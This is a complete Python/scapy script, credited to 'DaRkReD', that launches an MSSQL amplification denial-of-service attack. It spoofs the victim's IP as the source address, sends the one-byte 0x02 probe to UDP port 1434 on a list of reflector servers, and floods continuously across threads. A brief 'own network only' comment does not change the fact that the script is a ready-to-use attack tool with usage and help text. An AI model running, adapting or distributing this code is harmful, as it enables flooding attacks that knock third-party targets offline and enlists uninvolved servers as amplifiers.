#!/usr/bin/env python
from scapy.all import *
import sys
import threading
import time
#mssql Amp DOS attack
#by DaRkReD
#usage mssqldos.py <target ip> <mssqlserver list> <number of threads> ex: mssqldos.py 1.2.3.4 file.txt 10
#FOR USE ON YOUR OWN NETWORK ONLY


#packet sender
def deny():
	#Import globals to function
	global mssqllist
	global currentserver
	global data
	global target
	mssqlserver = mssqllist[currentserver] #Get new server
	currentserver = currentserver + 1 #Increment for next 
	packet = IP(dst=mssqlserver,src=target)/UDP(sport=44206,dport=1434)/Raw(load=data) #BUILD IT
	send(packet,loop=1) #SEND IT

#So I dont have to have the same stuff twice
def printhelp():
	print "MSSQL Amplification DOS Attack"
	print "By DaRkReD"
	print "Usage mssqldos.py <target ip> <mssqlserver list> <number of threads>"
	print "ex: ex: mssqldos.py 1.2.3.4 file.txt 10"
	print "mssql serverlist file should contain one IP per line"
	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
	exit(0)

if len(sys.argv) < 4:
	printhelp()
#Fetch Args
target = sys.argv[1]

#Help out idiots
if target in ("help","-h","h","?","--h","--help","/?"):
	printhelp()

mssqlserverfile = sys.argv[2]
numberthreads = int(sys.argv[3])
#System for accepting bulk input
mssqllist = []
currentserver = 0
with open(mssqlserverfile) as f:
    mssqllist = f.readlines()

#Make sure we dont out of bounds
if  numberthreads > int(len(mssqllist)):
	print "Attack Aborted: More threads than servers"
	print "Next time dont create more threads than servers"
	exit(0)

#Magic Packet aka "2"
data = "\x02"

#Hold our threads
threads = []
print "Starting to flood: "+ target + " using MS-SQL list: " + mssqlserverfile + " With " + str(numberthreads) + " threads"
print "Use CTRL+C to stop attack"

#Thread spawner
for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()

    threads.append(thread)

#In progress!
print "Sending..."

#Keep alive so ctrl+c still kills all them threads
while True:
	time.sleep(1)